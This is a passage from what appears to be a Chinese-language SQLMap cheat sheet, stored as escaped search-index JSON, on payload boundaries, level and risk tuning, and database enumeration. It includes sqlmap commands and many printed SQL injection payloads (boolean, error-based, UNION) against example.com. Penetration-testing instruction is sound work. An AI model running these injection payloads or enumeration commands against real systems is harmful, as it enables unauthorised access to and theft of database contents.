SQLMap\u3002\u53d1\u9001\u5230\u76ee\u6807\u7684\u6bcf\u4e2a payloads \u5305\u62ec\uff1a</p> <ul> <li> <p>vector(\u62fc\u63a5) (\u4f8b\u5982\uff0c<code>UNION ALL SELECT 1,2,VERSION()</code>) \uff1a\u6709\u6548\u8f7d\u8377\u7684\u4e2d\u5fc3\u90e8\u5206\uff0c\u643a\u5e26\u8981\u5728\u76ee\u6807\u5904\u6267\u884c\u7684\u6709\u7528 SQL \u4ee3\u7801\u3002</p> </li> <li> <p>boundaries(\u95ed\u5408) \uff08\u4f8b\u5982 <code>'&lt;vector&gt;-- -</code>\uff09\uff1a\u524d\u7f00\u548c\u540e\u7f00\u5f62\u5f0f\uff0c\u7528\u4e8e\u5c06 vector \u6b63\u786e\u6ce8\u5165\u5230\u6613\u53d7\u653b\u51fb\u7684 SQL \u8bed\u53e5\u4e2d\u3002</p> </li> </ul>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#_5","title":"\u524d\u7f00/\u540e\u7f00","text":"<p>\u5728\u6781\u5c11\u6570\u60c5\u51b5\u4e0b\u9700\u8981\u7279\u6b8a\u7684\u524d\u7f00\u548c\u540e\u7f00\u503c\uff0c\u5e38\u89c4 SQLMap \u8fd0\u884c\u672a\u6db5\u76d6\u8fd9\u4e9b\u503c\u3002 \u5bf9\u4e8e\u6b64\u7c7b\u8fd0\u884c\uff0c\u9009\u9879 <code>--prefix</code> \u548c <code>--suffix</code> \u53ef\u4ee5\u6309\u5982\u4e0b\u65b9\u5f0f\u4f7f\u7528\uff1a</p> <pre><code>sqlmap -u \"www.example.com/?q=test\" --prefix=\"%'))\" --suffix=\"-- -\"\n</code></pre> <p>\u8fd9\u5c06\u5bfc\u81f4 vecter \u503c\u5305\u542b\u5728\u9759\u6001\u524d\u7f00 <code>%'))</code> \u548c\u540e\u7f00 <code>-- -</code> \u4e4b\u95f4 \u3002 \u4f8b\u5982\uff0c\u5982\u679c\u76ee\u6807\u5904\u7684\u6613\u53d7\u653b\u51fb\u4ee3\u7801\u662f\uff1a</p> <pre><code>$query = \"SELECT id,name,surname FROM users WHERE id LIKE (('\" . $_GET[\"q\"] . \"')) LIMIT 0,1\";\n$result = mysqli_query($link, $query);\n</code></pre> <p>\u5411\u91cf <code>UNION ALL SELECT 1,2,VERSION()</code>\uff0c\u4ee5\u524d\u7f00 <code>%'))</code> \u548c\u540e\u7f00 <code>-- -</code> \u4e3a\u754c\uff0c\u5c06\u5728\u76ee\u6807\u5904\u4ea7\u751f\u4ee5\u4e0b\uff08\u6709\u6548\uff09SQL \u8bed\u53e5:</p> <pre><code>SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1\n</code></pre>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#levelrisk","title":"Level/Risk","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cSQLMap \u7ed3\u5408\u4e86\u4e00\u7ec4\u9884\u5b9a\u4e49\u7684\u6700\u5e38\u89c1\u8fb9\u754c\uff08\u5373\u524d\u7f00/\u540e\u7f00\u5bf9\uff09\uff0c\u4ee5\u53ca\u5728\u6613\u53d7\u653b\u51fb\u7684\u76ee\u6807\u60c5\u51b5\u4e0b\u6210\u529f\u7387\u5f88\u9ad8\u7684\u5411\u91cf\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u7528\u6237\u8fd8\u662f\u6709\u53ef\u80fd\u4f7f\u7528\u66f4\u5927\u7684 boundaries \u548cvector \u96c6\uff0c\u8fd9\u4e9b\u5df2\u7ecf\u5408\u5e76\u5230 SQLMap \u4e2d\u3002</p> <p>\u5bf9\u4e8e\u6b64\u7c7b\u9700\u6c42\uff0c\u5e94\u4f7f\u7528\u9009\u9879 <code>--level</code> \u548c <code>--risk</code> :</p> <ul> <li> <p>\u9009\u9879 <code>--level</code> \uff08<code>1-5</code>\uff0c\u9ed8\u8ba4\u4e3a <code>1</code>\uff09\u6839\u636e\u5b83\u4eec\u5bf9\u6210\u529f\u7684\u671f\u671b\uff08\u5373\u671f\u671b\u8d8a\u4f4e\uff0c\u7ea7\u522b\u8d8a\u9ad8\uff09\u6269\u5c55\u6b63\u5728\u4f7f\u7528\u7684vector\u548cboundaries\u3002</p> </li> <li> <p>\u9009\u9879 <code>--risk</code>\uff08<code>1-3</code>\uff0c\u9ed8\u8ba4 <code>1</code>\uff09\u6839\u636e\u5b83\u4eec\u5728\u76ee\u6807\u7aef\u5f15\u8d77\u95ee\u9898\u7684\u98ce\u9669\uff08\u5373\u6570\u636e\u5e93\u6761\u76ee\u4e22\u5931\u6216\u62d2\u7edd\u670d\u52a1\u7684\u98ce\u9669\uff09\u6269\u5c55\u4f7f\u7528\u7684vector\u96c6\u3002</p> </li> </ul> <p>\u5bf9\u4e8e\u4e0d\u540c\u7684 <code>--level</code> \u548c <code>--risk</code> \u503c\uff0c\u68c0\u67e5\u4f7f\u7528\u7684 boundaries \u548c\u6709\u6548 payload \u4e4b\u95f4\u5dee\u5f02\u7684\u6700\u4f73\u65b9\u6cd5\u662f\u4f7f\u7528 <code>-v</code> \u9009\u9879\u6765\u8bbe\u7f6e\u8be6\u7ec6\u7ea7\u522b\u3002\u5728 verbosity 3 \u6216\u66f4\u9ad8\u7ea7\u522b\uff08\u4f8b\u5982 -v 3\uff09\uff0c\u5c06\u663e\u793a\u5305\u542b\u4f7f\u7528\u7684 <code>[PAYLOAD]</code> \u7684\u6d88\u606f\uff0c\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>$ sqlmap -u www.example.com/?id=1 -v 3 --level=5\n\n...SNIP...\n[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO\n[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236\n...SNIP...\n[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT\n[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs\n[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg\n...SNIP...\n[14:17:07] [PAYLOAD] 1\")) AND 4540=7088 AND ((\"hUye\"=\"hUye\n[14:17:07] [PAYLOAD] 1\"))) AND 6823=7134 AND (((\"aWZj\"=\"aWZj\n[14:17:07] [PAYLOAD] 1\" AND 7613=7254 AND \"NMxB\"=\"NMxB\n...SNIP...\n[14:17:07] [PAYLOAD] 1\"=\"1\" AND 3219=7390 AND \"1\"=\"1\n[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#\n[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n</code></pre> <p>\u53e6\u4e00\u65b9\u9762\uff0c\u4e0e\u9ed8\u8ba4 <code>--level</code> \u503c\u4e00\u8d77\u4f7f\u7528\u7684\u6709\u6548\u8f7d\u8377\u5177\u6709\u76f8\u5f53\u5c0f\u7684\u4e00\u7ec4boundaries\uff1a</p> <pre><code>$ sqlmap -u www.example.com/?id=1 -v 3\n...SNIP...\n[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[14:20:36] [PAYLOAD] 1) AND 2678=8644 AND (3836=3836\n[14:20:36] [PAYLOAD] 1 AND 7496=4313\n[14:20:36] [PAYLOAD] 1 AND 7036=6691-- DmQN\n[14:20:36] [PAYLOAD] 1') AND 9393=3783 AND ('SgYz'='SgYz\n[14:20:36] [PAYLOAD] 1' AND 6214=3411 AND 'BhwY'='BhwY\n[14:20:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'\n</code></pre> <p>\u81f3\u4e8e vector\uff0c\u6211\u4eec\u53ef\u4ee5\u6bd4\u8f83\u4f7f\u7528\u7684\u6709\u6548\u8f7d\u8377\u5982\u4e0b\uff1a</p> <pre><code>$ sqlmap -u www.example.com/?id=1\n...SNIP...\n[14:42:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[14:42:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'\n[14:42:38] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'\n...SNIP...\n</code></pre> <pre><code>$ sqlmap -u www.example.com/?id=1 --level=5 --risk=3\n\n...SNIP...\n[14:46:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'\n[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'\n[14:46:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'\n...SNIP...\n[14:46:05] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'\n[14:46:05] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'\n[14:46:05] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'\n...SNIP...\n[14:46:05] [INFO] testing 'MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause'\n[14:46:05] [INFO] testing 'MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'\n[14:46:05] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'\n...SNIP...\n[14:46:05] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'\n[14:46:06] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'\n[14:46:06] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'\n...SNIP...\n</code></pre> <p>\u81f3\u4e8e\u6709\u6548 payload \u7684\u6570\u91cf\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08\u5373 <code>--level=1 --risk=1</code>\uff09\uff0c\u7528\u4e8e\u6d4b\u8bd5\u5355\u4e2a\u53c2\u6570\u7684\u6709\u6548 payload \u6570\u91cf\u6700\u591a\u4e3a72\uff0c\u800c\u5728\u6700\u8be6\u7ec6\u7684\u60c5\u51b5\u4e0b\uff08<code>--level=5 --risk=3</code>) \u6709\u6548 payload \u7684\u6570\u91cf\u589e\u52a0\u5230 7,865\u3002</p> <p>\u7531\u4e8e SQLMap \u5df2\u7ecf\u8c03\u6574\u4e3a\u68c0\u67e5\u6700\u5e38\u89c1\u7684 boundaries \u548c vector\uff0c\u56e0\u6b64\u5efa\u8bae\u666e\u901a\u7528\u6237\u4e0d\u8981\u89e6\u6478\u8fd9\u4e9b\u9009\u9879\uff0c\u56e0\u4e3a\u8fd9\u4f1a\u4f7f\u6574\u4e2a\u68c0\u6d4b\u8fc7\u7a0b\u53d8\u5f97\u76f8\u5f53\u6162\u3002\u7136\u800c\uff0c\u5728 SQLi \u6f0f\u6d1e\u7684\u7279\u6b8a\u60c5\u51b5\u4e0b\uff0c\u5fc5\u987b\u4f7f\u7528 <code>OR</code> payloads \uff08\u4f8b\u5982\uff0c\u5728<code>\u767b\u5f55</code>\u9875\u9762\u7684\u60c5\u51b5\u4e0b\uff09\uff0c\u6211\u4eec\u53ef\u80fd\u4e0d\u5f97\u4e0d\u81ea\u5df1\u63d0\u9ad8\u98ce\u9669\u7ea7\u522b\u3002</p> <p>\u8fd9\u662f\u56e0\u4e3a <code>OR</code> \u6709\u6548\u8f7d\u8377\u5728\u9ed8\u8ba4\u8fd0\u884c\u4e2d\u5177\u6709\u56fa\u6709\u7684\u5371\u9669\u6027\uff0c\u5176\u4e2d\u6f5c\u5728\u7684\u6613\u53d7\u653b\u51fb\u7684 SQL \u8bed\u53e5\uff08\u5c3d\u7ba1\u4e0d\u592a\u5e38\u89c1\uff09\u6b63\u5728\u4e3b\u52a8\u4fee\u6539\u6570\u636e\u5e93\u5185\u5bb9\uff08\u4f8b\u5982 <code>DELETE</code> \u6216 <code>UPDATE</code>\uff09\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#_6","title":"\u8fdb\u9636\u8c03\u6574","text":"<p>\u4e3a\u4e86\u8fdb\u4e00\u6b65\u5fae\u8c03\u68c0\u6d4b\u673a\u5236\uff0c\u6709\u5927\u91cf\u7684\u5f00\u5173\u548c\u9009\u9879\u3002\u5728\u5e38\u89c4\u60c5\u51b5\u4e0b\uff0cSQLMap \u4e0d\u9700\u8981\u4f7f\u7528\u5b83\u3002\u5c3d\u7ba1\u5982\u6b64\uff0c\u6211\u4eec\u8fd8\u662f\u9700\u8981\u719f\u6089\u5b83\u4eec\uff0c\u4ee5\u4fbf\u6211\u4eec\u53ef\u4ee5\u5728\u9700\u8981\u65f6\u4f7f\u7528\u5b83\u4eec\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#_7","title":"\u72b6\u6001\u7801","text":"<p>\u4f8b\u5982\uff0c\u5728\u5904\u7406\u5305\u542b\u5927\u91cf\u52a8\u6001\u5185\u5bb9\u7684\u5de8\u5927\u76ee\u6807\u54cd\u5e94\u65f6\uff0c<code>TRUE</code> \u548c <code>FALSE</code> \u54cd\u5e94\u4e4b\u95f4\u7684\u7ec6\u5fae\u5dee\u522b\u53ef\u7528\u4e8e\u68c0\u6d4b\u76ee\u7684\u3002\u5982\u679c\u53ef\u4ee5\u5728 HTTP \u4ee3\u7801\u4e2d\u770b\u5230 <code>TRUE</code> \u548c <code>FALSE</code> \u54cd\u5e94\u4e4b\u95f4\u7684\u5dee\u5f02\uff08\u4f8b\u5982 <code>200</code> \u4ee3\u8868 <code>TRUE</code>\uff0c<code>500</code> \u4ee3\u8868 <code>FALSE</code>\uff09\uff0c\u9009\u9879 <code>--code</code> \u53ef\u4ee5\u7528\u4e8e\u5c06 <code>TRUE</code> \u54cd\u5e94\u7684\u68c0\u6d4b\u56fa\u5b9a\u5230\u7279\u5b9a\u7684 HTTP \u4ee3\u7801\uff08\u4f8b\u5982 <code>--code=200</code>\uff09\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#_8","title":"\u6807\u9898","text":"<p>\u5982\u679c\u901a\u8fc7\u68c0\u67e5 HTTP \u9875\u9762\u6807\u9898\u53ef\u4ee5\u770b\u51fa\u54cd\u5e94\u4e4b\u95f4\u7684\u5dee\u5f02\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u5f00\u5173 <code>--titles</code> \u6307\u793a\u68c0\u6d4b\u673a\u5236\u6839\u636e HTML \u6807\u8bb0 <code>&lt;title&gt;</code> \u7684\u5185\u5bb9\u8fdb\u884c\u6bd4\u8f83\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#strings","title":"Strings","text":"<p>\u5982\u679c\u7279\u5b9a\u5b57\u7b26\u4e32\u503c\u51fa\u73b0\u5728 <code>TRUE</code> \u54cd\u5e94\u4e2d\uff08\u4f8b\u5982 <code>success</code>\uff09\uff0c\u800c\u5728 <code>FALSE</code> \u54cd\u5e94\u4e2d\u4e0d\u5b58\u5728\uff0c\u9009\u9879 <code>--string</code> \u53ef\u7528\u4e8e\u4ec5\u57fa\u4e8e\u8be5\u5355\u4e2a\u503c\u7684\u51fa\u73b0\uff08\u4f8b\u5982 <code>--string=success</code> ).</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#text-only","title":"Text-only","text":"<p>\u5f53\u5904\u7406\u5f88\u591a\u9690\u85cf\u5185\u5bb9\u65f6\uff0c\u6bd4\u5982\u67d0\u4e9b HTML \u9875\u9762\u884c\u4e3a\u6807\u7b7e\uff08\u5982 <code>&lt;script&gt;</code>\u3001<code>&lt;style&gt;</code>\u3001<code>&lt;meta&gt;</code> \u7b49\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>--text-only</code> \u5f00\u5173\uff0c\u5b83\u4f1a\u53bb\u9664\u6240\u6709\u7684 HTML\u6807\u7b7e\uff0c\u5e76\u4e14\u4ec5\u57fa\u4e8e\u6587\u672c\uff08\u5373\u53ef\u89c1\uff09\u5185\u5bb9\u8fdb\u884c\u6bd4\u8f83\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#techniques","title":"Techniques","text":"<p>\u5728\u67d0\u4e9b\u7279\u6b8a\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5fc5\u987b\u5c06\u4f7f\u7528\u7684\u6709\u6548\u8f7d\u8377\u7f29\u5c0f\u5230\u7279\u5b9a\u7c7b\u578b\u3002\u4f8b\u5982\uff0c\u5982\u679c\u57fa\u4e8e\u65f6\u95f4\u7684\u76f2\u8d1f\u8f7d\u4ee5\u54cd\u5e94\u8d85\u65f6\u7684\u5f62\u5f0f\u9020\u6210\u95ee\u9898\uff0c\u6216\u8005\u5982\u679c\u6211\u4eec\u60f3\u5f3a\u5236\u4f7f\u7528\u7279\u5b9a\u7684 SQLi \u8d1f\u8f7d\u7c7b\u578b\uff0c\u9009\u9879 <code>--technique</code> \u53ef\u4ee5\u6307\u5b9a\u8981\u4f7f\u7528\u7684 SQLi \u6280\u672f\u3002</p> <p>\u4f8b\u5982\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8df3\u8fc7\u57fa\u4e8e\u65f6\u95f4\u7684\u76f2\u76ee\u548c\u5806\u53e0 SQLi payloads \uff0c\u800c\u53ea\u6d4b\u8bd5\u57fa\u4e8e\u5e03\u5c14\u7684\u76f2\u76ee\u3001\u57fa\u4e8e\u9519\u8bef\u548c UNION \u67e5\u8be2\u7684 payloads \uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>--technique=BEU</code> \u6307\u5b9a\u8fd9\u4e9b\u6280\u672f\u3002</p>"},{"location":"CheetSheet/SQLMAP/4%E3%80%81%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB/#union-sqli-tuning","title":"UNION SQLi Tuning","text":"<p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c<code>UNION</code> SQLi payloads \u9700\u8981\u989d\u5916\u7684\u7528\u6237\u63d0\u4f9b\u7684\u4fe1\u606f\u624d\u80fd\u5de5\u4f5c\u3002\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u624b\u52a8\u627e\u5230\u6613\u53d7\u653b\u51fb\u7684 SQL \u67e5\u8be2\u7684\u786e\u5207\u5217\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9009\u9879 <code>--union-cols</code>\uff08\u4f8b\u5982 <code>--union-cols=17</code>\uff09\u5c06\u6b64\u6570\u5b57\u63d0\u4f9b\u7ed9 SQLMap\u3002\u5982\u679c SQLMap \u4f7f\u7528\u7684\u9ed8\u8ba4\u201c\u865a\u62df\u201d\u586b\u5145\u503c -<code>NULL</code> \u548c\u968f\u673a\u6574\u6570 - \u4e0e\u6613\u53d7\u653b\u51fb\u7684 SQL \u67e5\u8be2\u7ed3\u679c\u7684\u503c\u4e0d\u517c\u5bb9\uff0c\u6211\u4eec\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u66ff\u4ee3\u503c\uff08\u4f8b\u5982 <code>--union-char='a'</code> ).</p> <p>\u6b64\u5916\uff0c\u5982\u679c\u9700\u8981\u4ee5 <code>FROM &lt;table&gt;</code> \u7684\u5f62\u5f0f\u5728 <code>UNION</code> \u67e5\u8be2\u672b\u5c3e\u4f7f\u7528\u9644\u5f55\uff08\u4f8b\u5982\uff0c\u5728 Oracle \u7684\u60c5\u51b5\u4e0b\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u9009\u9879 <code>--union-from</code> (\u4f8b\u5982 <code>--union-from=users</code>\uff09\u3002 \u672a\u80fd\u81ea\u52a8\u4f7f\u7528\u6b63\u786e\u7684 <code>FROM</code> \u9644\u5f55\u53ef\u80fd\u662f\u7531\u4e8e\u65e0\u6cd5\u5728\u4f7f\u7528\u524d\u68c0\u6d4b\u5230 DBMS \u540d\u79f0\u3002</p> <p>UNION ALL SELECT NULL,CONCAT(CONCAT('qqxkq','aXZHZVcSsclfDMVozxoBQWAEcBrvnNRALhFKSkJH'),'qkkqq'),NULL,NULL,NULL-- gBKM </p>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/","title":"5\u3001\u6570\u636e\u5e93\u679a\u4e3e","text":"<p>\u679a\u4e3e\u662f SQL \u6ce8\u5165\u653b\u51fb\u7684\u6838\u5fc3\u90e8\u5206\uff0c\u5b83\u662f\u5728\u6210\u529f\u68c0\u6d4b\u5e76\u786e\u8ba4\u76ee\u6807 SQLi \u6f0f\u6d1e\u7684\u53ef\u5229\u7528\u6027\u4e4b\u540e\u7acb\u5373\u6267\u884c\u7684\u3002\u5b83\u5305\u62ec\u4ece\u6613\u53d7\u653b\u51fb\u7684\u6570\u636e\u5e93\u4e2d\u67e5\u627e\u548c\u68c0\u7d22\uff08\u5373\u6e17\u6f0f\uff09\u6240\u6709\u53ef\u7528\u4fe1\u606f\u3002</p>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/#sqlmap-data-exfiltration","title":"SQLMap Data Exfiltration","text":"<p>\u4e3a\u6b64\uff0cSQLMap \u4e3a\u6240\u6709\u53d7\u652f\u6301\u7684 DBMS \u63d0\u4f9b\u4e86\u4e00\u7ec4\u9884\u5b9a\u4e49\u7684\u67e5\u8be2\uff0c\u5176\u4e2d\u6bcf\u4e2a\u6761\u76ee\u4ee3\u8868\u5fc5\u987b\u5728\u76ee\u6807\u4e0a\u8fd0\u884c\u4ee5\u68c0\u7d22\u6240\u9700\u5185\u5bb9\u7684 SQL\u3002\u4f8b\u5982\uff0c MySQL DBMS \u7684queries.xml\u7684\u6458\u5f55\u5982\u4e0b\u6240\u793a\uff1a</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n\n&lt;root&gt;\n    &lt;dbms value=\"MySQL\"&gt;\n        &lt;!-- http://dba.fyicenter.com/faq/mysql/Difference-between-CHAR-and-NCHAR.html --&gt;\n        &lt;cast query=\"CAST(%s AS NCHAR)\"/&gt;\n        &lt;length query=\"CHAR_LENGTH(%s)\"/&gt;\n        &lt;isnull query=\"IFNULL(%s,' ')\"/&gt;\n...SNIP...\n        &lt;banner query=\"VERSION()\"/&gt;\n        &lt;current_user query=\"CURRENT_USER()\"/&gt;\n        &lt;current_db query=\"DATABASE()\"/&gt;\n        &lt;hostname query=\"@@HOSTNAME\"/&gt;\n        &lt;table_comment query=\"SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'\"/&gt;\n        &lt;column_comment query=\"SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'\"/&gt;\n        &lt;is_dba query=\"(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'\"/&gt;\n        &lt;check_udf query=\"(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'\"/&gt;\n        &lt;users&gt;\n            &lt;inband query=\"SELECT grantee FROM INFORMATION_SCHEMA.USER_PRIVILEGES\" query2=\"SELECT user FROM mysql.user\" query3=\"SELECT username FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS\"/&gt;\n            &lt;blind query=\"SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT %d,1\" query2=\"SELECT DISTINCT(user) FROM mysql.user LIMIT %d,1\" query3=\"SELECT DISTINCT(username) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS LIMIT %d,1\" count=\"SELECT COUNT(DISTINCT(grantee)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES\" count2=\"SELECT COUNT(DISTINCT(user)) FROM mysql.user\" count3=\"SELECT COUNT(DISTINCT(username)) FROM DATA_DICTIONARY.CUMULATIVE_USER_STATS\"/&gt;\n        &lt;/users&gt;\n    ...SNIP...\n</code></pre> <p>\u4f8b\u5982\uff0c\u5982\u679c\u7528\u6237\u60f3\u8981\u68c0\u7d22\u57fa\u4e8e MySQL DBMS \u7684\u76ee\u6807\u7684\u201cbanner\u201d\uff08switch <code>--banner</code>\uff09\uff0c\u5219 <code>VERSION()</code> \u67e5\u8be2\u5c06\u7528\u4e8e\u6b64\u76ee\u7684\u3002</p> <p>\u5982\u679c\u68c0\u7d22\u5f53\u524d\u7528\u6237\u540d\uff08switch <code>--current-user</code>\uff09\uff0c\u5c06\u4f7f\u7528 <code>CURRENT_USER()</code> \u67e5\u8be2\u3002</p> <p>\u53e6\u4e00\u4e2a\u793a\u4f8b\u662f\u68c0\u7d22\u6240\u6709\u7528\u6237\u540d\uff08\u5373\u6807\u8bb0 <code>&lt;users&gt;</code>\uff09\u3002\u6839\u636e\u60c5\u51b5\uff0c\u4f7f\u7528\u4e86\u4e24\u4e2a\u67e5\u8be2\u3002\u6807\u8bb0\u4e3a <code>inband</code> \u7684\u67e5\u8be2\u7528\u4e8e\u6240\u6709\u975e\u76f2\u6ce8\u60c5\u51b5\uff08\u5373 UNION \u67e5\u8be2\u548c\u57fa\u4e8e\u9519\u8bef\u7684 SQLi\uff09\uff0c\u5176\u4e2d\u67e5\u8be2\u7ed3\u679c\u53ef\u4ee5\u5728\u54cd\u5e94\u672c\u8eab\u4e2d\u9884\u671f\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u6807\u8bb0\u4e3a <code>blind</code> \u7684\u67e5\u8be2\u7528\u4e8e\u6240\u6709\u76f2\u6ce8\u60c5\u51b5\uff0c\u5176\u4e2d\u5fc5\u987b\u9010\u884c\u3001\u9010\u5217\u548c\u9010\u4f4d\u68c0\u7d22\u6570\u636e\u3002</p>"},{"location":"CheetSheet/SQLMAP/5%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9E%9A%E4%B8%BE/#_1","title":"\u57fa\u672c\u6570\u636e\u5e93\u6570\u636e\u679a\u4e3e","text":"<p>\u901a\u5e38\uff0c\u5728\u6210\u529f\u68c0\u6d4b\u5230 SQLi \u6f0f\u6d1e\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5f00\u59cb\u4ece\u6570\u636e\u5e93\u4e2d\u679a\u4e3e\u57fa\u672c\u7ec6\u8282\uff0c\u4f8b\u5982\u6613\u53d7\u653b\u51fb\u76ee\u6807\u7684\u4e3b\u673a\u540d (<code>--hostname</code>)\u3001\u5f53\u524d\u7528\u6237\u540d (<code>--current-user</code>)\u3001\u5f53\u524d\u6570\u636e\u5e93\u540d\u79f0 (<code>--current-db</code>)\uff0c\u6216\u5bc6\u7801\u54c8\u5e0c (<code>--passwords</code>)\u3002 SQLMap\u5982\u679c\u65e9\u5148\u88ab\u8bc6\u522b\u51fa\u6765\uff0c\u5c31\u4f1a\u8df3\u8fc7SQLi\u7684\u68c0\u6d4b\uff0c\u76f4\u63a5\u5f00\u59cbDBMS\u7684\u679a\u4e3e\u8fc7\u7a0b\u3002</p> <p>\u679a\u4e3e\u901a\u5e38\u4ece\u68c0\u7d22\u57fa\u672c\u4fe1\u606f\u5f00\u59cb\uff1a - \u6570\u636e\u5e93\u7248\u672c\u6a2a\u5e45\uff08switch <code>--banner</code>\uff09 - Current user name (switch\u00a0<code>--current-user</code>) - Current database name (switch\u00a0<code>--current-db</code>) - \u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u5177\u6709 DBA\uff08\u7ba1\u7406\u5458\uff09\u6743\u9650\u3002</p> <p>\u4ee5\u4e0b SQLMap \u547d\u4ee4\u6267\u884c\u4ee5\u4e0a\u6240\u6709\u64cd\u4f5c\uff1a</p> <pre><code>$ sqlmap -u \"http://www.example.com/?id=1\" --banner --current-user --current-db --is-dba\n\n        ___\n       __H__\n ___ ___[']_____ ___ ___  {1.4.9}\n|_ -| . [']     | .'| . |\n|___|_  [.]_|_|_|__,|  _|\n      |_|V...       |_|   http://sqlmap.org\n\n\n[*] starting @ 13:30:57 /2020-09-17/\n\n[13:30:57] [INFO] resuming back-end DBMS 'mysql' \n[13:30:57] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: id (GET)\n    Type: boolean-based blind\n    Title: AND boolean-based blind - WHERE or HAVING clause\n    Payload: id=1 AND 5134=5134\n\n    Type: error-based\n    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)\n\n    Type: UNION query\n    Title: Generic UNION query (NULL) - 3 columns\n    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -\n---\n[13:30:57] [INFO] the back-end DBMS is MySQL\n[13:30:57] [INFO] fetching banner\nweb application technology: PHP 5.2.6, Apache 